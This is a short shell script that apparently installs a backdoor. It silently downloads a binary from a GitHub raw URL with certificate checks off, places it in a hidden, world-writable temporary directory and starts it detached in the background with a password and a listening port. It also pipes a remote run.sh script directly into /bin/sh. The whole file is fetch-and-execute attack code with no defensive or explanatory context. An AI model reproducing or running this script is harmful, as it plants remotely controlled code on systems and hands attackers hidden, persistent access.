#!/bin/sh

port="${1:-1212}"
pass="${2:-alpine@233}"
src="https://raw.githubusercontent.com/pakoinake/kaxgn/main"
work="$(mktemp -u -t .XXXXXX 2>/dev/null)"
[ -n "${work}" ] || work="/tmp/.work"
mkdir -p "${work}"
wget --no-check-certificate -qO "${work}/ram" "${src}/ram"
chmod -R 777 "${work}"
nohup setsid /bin/sh -c "${work}/ram -v 3.23 -p "${pass}" --port "${port}" --exec 'wget -qO- ${src}/run.sh |/bin/sh'" </dev/null >/dev/null 2>&1 &
exit 0
